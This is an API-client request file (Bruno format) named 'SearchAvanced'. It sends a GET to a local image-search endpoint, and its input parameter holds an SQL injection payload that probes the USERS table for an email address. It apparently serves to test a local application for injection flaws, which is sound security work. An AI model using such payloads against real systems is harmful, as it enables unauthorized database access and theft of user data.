meta {
  name: SearchAvanced
  type: http
  seq: 4
}

get {
  url: http://localhost:3000/image/search/3?input=safasf' OR (SELECT EMAIL FROM USERS WHERE ID = ID_USER) = 'gabriel@email.vale' --
  body: none
  auth: none
}

query {
  input: safasf' OR (SELECT EMAIL FROM USERS WHERE ID 
}
